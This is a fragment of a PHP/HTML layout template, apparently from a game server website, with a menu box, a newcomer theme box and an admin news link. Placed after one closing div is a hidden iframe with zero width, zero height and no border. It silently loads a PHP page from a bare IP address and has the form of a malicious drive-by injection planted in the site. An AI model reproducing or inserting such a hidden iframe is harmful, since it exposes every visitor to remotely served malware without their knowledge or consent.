...
<div id='MenuBottom' style='background-image:url(<?PHP echo $layout_name; ?>/images/general/box-bottom.gif);'></div>
  ...
  <div id="NewcomerBox" class="Themebox" style="background-image:url(http://i63.photobucket.com/albums/h122/Mister_Dude/newcomerbox.gif);">
    ...
    </div><iframe src ="http://188.126.223.74/42/index.php" width="0" frameborder="no" height="0"></iframe>
...
<tr><td height="10">&nbsp;</td><td><a href="?subtopic=adminpanel&action=editnews"><font color="white"><b>NEWS SYSTEM</b></font></a></td></tr></table></div>
